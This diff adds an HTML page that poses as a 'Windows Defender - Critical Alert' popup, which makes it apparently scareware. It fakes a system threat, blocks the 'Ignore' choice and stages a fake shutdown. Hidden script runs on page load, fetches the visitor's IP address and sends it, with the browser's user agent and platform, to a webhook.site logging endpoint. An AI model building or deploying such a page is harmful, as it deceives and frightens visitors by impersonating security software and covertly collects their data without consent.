@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Windows Security Alert</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #000; margin: 0; overflow: hidden; }
+        .popup {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 460px; background: #f0f0f0; border: 3px solid #000;
+            box-shadow: 8px 8px 20px rgba(0,0,0,0.9); z-index: 9999;
+        }
+        .title-bar {
+            background: #000080; color: white; padding: 6px 10px;
+            font-weight: bold; display: flex; justify-content: space-between;
+        }
+        .content { padding: 25px; text-align: center; background: white; }
+        button { padding: 10px 30px; margin: 10px; font-size: 15px; cursor: pointer; }
+        .red-btn { background: #c00; color: white; border: none; }
+    </style>
+</head>
+<body>
+
+<div class="popup">
+    <div class="title-bar">
+        <span>Windows Defender - Critical Alert</span>
+        <span>×</span>
+    </div>
+    <div class="content">
+        <div style="font-size:60px;margin-bottom:15px;">⚠️</div>
+        <h2 style="color:#c00;">Critical System Threat Detected</h2>
+        <p><strong>Immediate action required!</strong></p>
+        <button onclick="fakeFix()" class="red-btn">Fix Now</button>
+        <button onclick="alert('Access Denied')">Ignore</button>
+    </div>
+</div>
+
+<script>
+// === IP Logging ===
+fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+      const ip = data.ip;
+      // Send IP to a free logging service (you can check it here: https://webhook.site)
+      fetch('https://webhook.site/YOUR-UNIQUE-ID-HERE', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+              ip: ip,
+              time: new Date().toLocaleString(),
+              userAgent: navigator.userAgent,
+              platform: navigator.platform
+          })
+      });
+  })
+  .catch(() => {});
+
+// Fake shutdown sequence
+function fakeFix() {
+    alert("🔍 Scanning system...");
+    setTimeout(() => {
+        alert("❌ Failed to remove threat!\n\nSystem will shutdown to prevent damage.");
+    }, 1000);
+}
+</script>
+
+</body>
+</html>
